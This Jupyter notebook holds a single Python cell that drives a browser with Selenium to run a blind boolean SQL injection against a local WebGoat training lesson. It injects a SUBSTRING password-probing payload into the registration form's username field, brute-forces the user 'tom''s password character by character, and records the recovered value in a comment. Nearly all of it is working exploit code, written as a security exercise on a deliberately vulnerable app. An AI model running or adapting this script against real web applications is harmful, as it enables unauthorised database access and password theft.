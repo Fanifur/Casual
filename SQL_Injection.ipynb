{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Loading libraries\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.chrome.service import Service\n",
    "from webdriver_manager.chrome import ChromeDriverManager\n",
    "from selenium.webdriver.common.by import By\n",
    "from time import sleep\n",
    "\n",
    "# Opening browser and webpage\n",
    "browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()))\n",
    "browser.get(\"http://127.0.0.1:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson/4\")\n",
    "\n",
    "# Finding interactive elements of register form\n",
    "register_form = browser.find_element(By.ID,\"register-form-link\")\n",
    "register_username = browser.find_element(By.ID,'username')\n",
    "register_email = browser.find_element(By.ID,'email')\n",
    "register_password = browser.find_element(By.ID,'password')\n",
    "register_password2 = browser.find_element(By.ID,'confirm-password')\n",
    "register_button = browser.find_element(By.ID,'register-submit')\n",
    "\n",
    "# Function testing character on position\n",
    "def testChar(username,position,char):\n",
    "    input = username + \"' AND SUBSTRING(password,\" + str(position)+\",1)='\" + char\n",
    "    \n",
    "    register_form.click()\n",
    "    register_username.click()\n",
    "    register_username.clear()\n",
    "    register_username.send_keys(input)\n",
    "    register_email.clear()\n",
    "    register_email.send_keys('1@1')\n",
    "    register_password.clear()\n",
    "    register_password.send_keys('123')\n",
    "    register_password2.clear()\n",
    "    register_password2.send_keys('123')\n",
    "    register_button.click()\n",
    "    \n",
    "    sleep(0.3) # Waiting for updated response\n",
    "    \n",
    "    message = browser.find_element(By.XPATH,'//*[@id=\"lesson-content-wrapper\"]/div[6]/div[7]/div[4]/div[3]')\n",
    "    return ('exists' in message.text)\n",
    "\n",
    "# Brute force method of finding password\n",
    "def find_password(username, base,start=1):\n",
    "    from random import shuffle\n",
    "    base = list(base)\n",
    "    shuffle(base)\n",
    "    keepGoing = True\n",
    "    password = []\n",
    "    p = start-1\n",
    "    while keepGoing :\n",
    "        itr = 0\n",
    "        p += 1\n",
    "        for c in base: # Go through all the characters from given base\n",
    "            if testChar(username,p,c) : # If correct, add it to password and go to next position\n",
    "                password.append(c)\n",
    "                print(c)\n",
    "                break\n",
    "            else :\n",
    "                itr += 1\n",
    "        if itr >= len(base) : # All characters checked - end attack\n",
    "            keepGoing = False\n",
    "    return password\n",
    "\n",
    "all = 'qwertyuiopasdfghjklzxcvbnm 1234567890QWERTYUIOPASDFGHJKLZXCVBNM!@#$%^&*()-_=+{[]}|\\\\:;\"\\',<.>/?~`'\n",
    "numeric = '1234567890'\n",
    "alpha = 'qwertyuiopasdfghjklzxcvbnm'\n",
    "print(find_password('tom',alpha,1))\n",
    "# thisisasecretfortomonly\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.8 64-bit (microsoft store)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "58dbfdb34cf82127b32c5737e6183911655ff227e5c11e8f5e4b25048ae98ef2"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
